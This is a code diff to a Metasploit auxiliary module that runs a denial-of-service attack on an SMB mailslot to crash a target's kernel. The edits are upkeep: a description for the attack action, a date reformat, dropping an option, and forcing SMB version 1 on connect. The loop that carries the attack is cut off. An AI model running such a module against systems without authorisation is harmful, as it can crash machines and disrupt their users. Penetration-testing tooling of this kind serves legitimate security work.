@@ -31,10 +31,10 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'Actions'     =>
         [
-          ['Attack'],
+          ['Attack', 'Description' => 'Run Denial of Service'],
         ],
       'DefaultAction' => 'Attack',
-      'DisclosureDate' => 'Jul 11 2006'
+      'DisclosureDate' => '2006-07-11'
     ))
 
     register_options(
@@ -42,6 +42,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('MAILSLOT', [ true,  "The mailslot name to use", 'Alerter']),
       ])
 
+    deregister_options('SMB::ProtocolVersion')
   end
 
   # MAILSLOT: HydraLsServer
@@ -55,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_status("Mangling the kernel, two bytes at a time...");
 
-      connect
+      connect(versions: [1])
       smb_login
 
       1.upto(1024) do |i|
